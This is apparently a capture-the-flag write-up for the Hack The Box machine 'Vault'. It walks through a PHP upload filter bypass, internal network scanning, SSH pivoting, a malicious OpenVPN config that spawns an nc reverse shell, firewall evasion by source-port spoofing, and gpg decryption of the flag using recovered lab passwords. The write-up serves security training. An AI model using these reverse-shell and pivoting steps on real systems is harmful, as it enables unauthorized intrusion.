## Vault

https://app.hackthebox.com/machines/161

<br>

#### First Access
Open 10.10.10.109:22
Open 10.10.10.109:80

http://vault.htb/sparklays/ - 403 Forbidden

**GoBuster**  
/login.php            (Status: 200)  
/admin.php            (Status: 200)  
/design               (Status: 301  

**Enumerating /design**  
/uploads (Status: 301)  
/design.html (Status: 200)  

Images get uploaded to http://vault.htb/sparklays/design/uploads/IMAGE-NAME

We can't upload file with .php, so probably there is a file extension validation. 

We try to upload files with the extensions below and discover that we can upload php5.
```
png
jpg
gif
txt
php
ph3
ph4
ph5
php3
php4
php5
png.php
```

Upload a reverse shell and get first access (exploit.py).

<br>

#### Dave User
Inside /home/dave/Desktop/ssh is dave's password: Dav3therav3123

<br>

#### Shell on DNS
Inside /home/dave/Desktop/Servers:
```
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
```

Let's search for Vault IP.
```bash
time for i in $(seq 1 254); do (ping -c 1 192.168.122.${i} | grep "bytes from" &); done

64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 192.168.122.4: icmp_seq=1 ttl=64 time=0.205 ms
64 bytes from 192.168.122.5: icmp_seq=1 ttl=64 time=1.05 ms
```

Enumerating DNS + Configurator ports:
```bash
time for i in $(seq 1 65535); do (nc -zvn 192.168.122.4 ${i} 2>&1 | grep -v "Connection refused" &); done          

Connection to 192.168.122.4 22 port [tcp/*] succeeded!
Connection to 192.168.122.4 80 port [tcp/*] succeeded!
```

Create a port forward over SSH to access DNS web panel and change SOCKS proxy on burp to access on our host.
```
[enter]~C
ssh> -D 8081

ssh -L 8001:127.0.0.1:80 dave@vault.htb
```

In the panel, the second link to `vpnconfig.php` displays a page that contains a VPN Configurator. We can exploit a [OpenVPN config to get RCE](https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/).

Creating malicious OpenVPN config:
```
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8181 >/tmp/f'"
nobind
```

With this shell, we find other credential (dav3gerous567) on /home/dave/ssh that we can use to login on DNS server and get root since the user has this permission.
```
ssh dave@192.168.122.4

sudo -l

sudo su
```

#### Vault Shell
On .bash_history we found:
```
ping 192.168.5.2
```

Searching for this IP on logs, we find a bunch of activity that looks like ssh on port 4444.
```
grep -rHa "192.168.5.2" /var/log

/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

Since nmap is installed on the host, we can inspect this IP, but everything seems closed.
```
nmap 192.168.5.2 -Pn -f
```

When we add `--source-port=4444`, we get port 987 open.

Checking what is running:
```
nc 192.168.5.2 987 -p 53
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

We can't set a source port on SSH, so we get the other found commands to redirect the connection of our localhost.
```
/usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
ssh dave@localhost -p 1234 -t bash
```

`-t bash` is used because without it, rbash is used and our shell would be very restricted.

<br>

#### Root Flag
Inside dave's home directory, there is this root.txt.gpg.

We need to find where the key is, so we encode to try on different hosts. It works on ubuntu as dave, and the passphrase is the key inside /home/dave/Desktop/key: `itscominghome`

```
base32 -w0 root.txt.gpg

echo QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY= | base32 -d > /dev/shm/a.gpg

gpg -d /dev/shm/a.gpg
```
